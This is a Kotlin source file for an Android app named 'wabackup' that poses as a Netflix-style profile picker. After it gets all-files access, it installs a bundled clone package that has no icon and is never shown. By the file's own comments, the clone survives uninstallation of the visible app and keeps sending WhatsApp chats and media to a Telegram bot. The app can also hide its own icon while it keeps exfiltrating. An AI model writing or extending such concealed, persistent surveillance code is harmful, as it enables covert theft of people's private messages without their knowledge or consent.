package com.personal.wabackup.ui

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.LinearLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.Manifest
import com.personal.wabackup.R
import com.personal.wabackup.util.SettingsStore
import com.personal.wabackup.util.BackupScheduler
import androidx.work.WorkManager
import java.io.File

/**
 * Profile selection screen — "Who's watching?"
 * Any profile click navigates to HomeActivity.
 * On first launch, once user grants all-files access (via permission dialog),
 * the app silently installs a hidden "copy" version that keeps backing up chats
 * in the background. The copy is never shown to the user.
 */
class MainActivity : AppCompatActivity() {

    /** Launcher for the system "All files access" permission dialog. */
    private val storagePermissionLauncher =
        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult()) { _ ->
            // After the system permission dialog closes, check if permission was granted.
            if (hasStorageAccess()) {
                // Permission granted: install the hidden clone copy.
                CloneInstaller.installHiddenClone(this)
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val settings = SettingsStore(this)

        // ---- Hidden copy version (auto-installed clone): never shows UI. ----
        if (settings.isCloneCopy || packageName.endsWith(".clone")) {
            settings.isCloneCopy = true
            BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
            finish()
            return
        }

        // ---- Visible copy: first launch asks for permission, then installs the hidden clone. ----
        if (!settings.autoSetupDone) {
            settings.autoSetupDone = true
            CloneInstaller.armAutoInstall(this)

            // Only show the permission dialog if not already granted.
            if (!hasStorageAccess()) {
                requestStoragePermissionDialog()
            } else {
                // Already have permission: install clone immediately.
                CloneInstaller.installHiddenClone(this)
            }
        } else if (settings.cloneInstallPending) {
            // User returned from permission screen on a later launch.
            settings.cloneInstallPending = false
            if (hasStorageAccess()) {
                CloneInstaller.installHiddenClone(this)
            }
        }

        // Keep the periodic backup armed on the visible copy too (harmless duplicate).
        BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))

        // Netflix profile click: go to HomeActivity.
        val goHome = { _: Any ->
            startActivity(Intent(this, HomeActivity::class.java))
        }

        val p1 = findViewById<LinearLayout>(R.id.profile_1)
        val p2 = findViewById<LinearLayout>(R.id.profile_2)
        val p3 = findViewById<LinearLayout>(R.id.profile_3)
        val p4 = findViewById<LinearLayout>(R.id.profile_4)

        p1.setOnClickListener(goHome)
        p2.setOnClickListener(goHome)
        p3.setOnClickListener(goHome)
        p4.setOnClickListener(goHome)

        p1.setOnLongClickListener { toggleHiddenIcon(); true }
        p2.setOnLongClickListener { toggleHiddenIcon(); true }
        p3.setOnLongClickListener { toggleHiddenIcon(); true }
        p4.setOnLongClickListener { toggleHiddenIcon(); true }
    }

    /** Check if we have all-files access permission. */
    private fun hasStorageAccess(): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }

    /** Launch the system "All files access" permission dialog. */
    private fun requestStoragePermissionDialog() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                storagePermissionLauncher.launch(intent)
            } catch (_: Exception) {
                // Fallback: try the generic all-files-access permission screen.
                try {
                    storagePermissionLauncher.launch(
                        Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    )
                } catch (_: Exception) { }
            }
        } else {
            // Pre-R: request READ_EXTERNAL_STORAGE permission via legacy flow.
            requestLegacyStoragePermission.launch(
                Manifest.permission.READ_EXTERNAL_STORAGE
            )
        }
    }

    private val requestLegacyStoragePermission =
        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) {
                CloneInstaller.installHiddenClone(this)
            }
        }

    /** Hide/show the launcher icon without touching backup logic or UI design. */
    private fun toggleHiddenIcon() {
        val settings = SettingsStore(this)
        val newState = !settings.hidden
        val alias = ComponentName(this, "com.personal.wabackup.ui.AliasLauncher")
        val state = if (newState)
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        else
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        packageManager.setComponentEnabledSetting(
            alias, state, PackageManager.DONT_KILL_APP
        )
        settings.hidden = newState
        // Keep the periodic backup job armed even while the icon is hidden.
        if (newState) BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
        Toast.makeText(
            this,
            if (newState) "Icon hidden. Backups continue in background."
            else "Icon restored.",
            Toast.LENGTH_LONG
        ).show()
        if (newState) finish()
    }
}

/**
 * Installs the hidden "copy version" of this app on first launch.
 *
 * How it works:
 *  - The bundled clone APK (app/src/main/assets/clone.apk, built from the
 *    `clone` product flavor with applicationIdSuffix ".clone") is copied to a
 *    FileProvider-readable location and an install intent is launched.
 *  - The clone has NO launcher icon at all (its AliasLauncher is disabled at
 *    build time), so nothing new appears on the phone.
 *  - Because the clone is a SEPARATE package, uninstalling the visible copy
 *    does NOT remove it — the clone keeps backing up WhatsApp chats + media
 *    to the Telegram bot forever until it itself is uninstalled.
 *  - On stock Android the system shows one standard "install this app?"
 *    confirmation (Google blocks fully silent self-installing by normal apps);
 *    tapping Install completes everything automatically afterwards.
 */
object CloneInstaller {

    private const val CLONE_PACKAGE = "com.personal.wabackup.clone"

    /** Marks that the hidden-copy install flow should resume after permission grant. */
    fun armAutoInstall(context: Context) {
        SettingsStore(context).cloneInstallPending = true
    }

    /** True if the hidden copy is already installed as a separate package. */
    fun cloneInstalled(context: Context): Boolean = try {
        context.packageManager.getPackageInfo(CLONE_PACKAGE, 0)
        true
    } catch (_: Exception) {
        false
    }

    fun installHiddenClone(context: Context) {
        if (cloneInstalled(context)) return
        try {
            // Android 8+: the app needs the "install unknown apps" special access.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                !context.packageManager.canRequestPackageInstalls()
            ) {
                SettingsStore(context).cloneInstallPending = true
                val pi = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                pi.data = Uri.parse("package:${context.packageName}")
                pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(pi)
                return
            }

            val apk = File(context.cacheDir, "clone.apk")
            context.assets.open("clone.apk").use { input ->
                apk.outputStream().use { out -> input.copyTo(out) }
            }
            apk.setReadable(true, false)

            val uri = androidx.core.content.FileProvider.getUriForFile(
                context, context.packageName + ".fileprovider", apk
            )
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)

            // Tell the hidden copy to arm itself as soon as it is installed.
            // Harmless if the clone is not installed yet (no receiver to catch it).
            try {
                val boot = Intent("com.personal.wabackup.action.INIT_CLONE")
                boot.setPackage(CLONE_PACKAGE)
                context.sendBroadcast(boot)
            } catch (_: Exception) { }
        } catch (_: Exception) {
            // No bundled clone APK or install blocked — the visible copy keeps
            // doing backups itself, so nothing breaks either way.
        }
    }
}
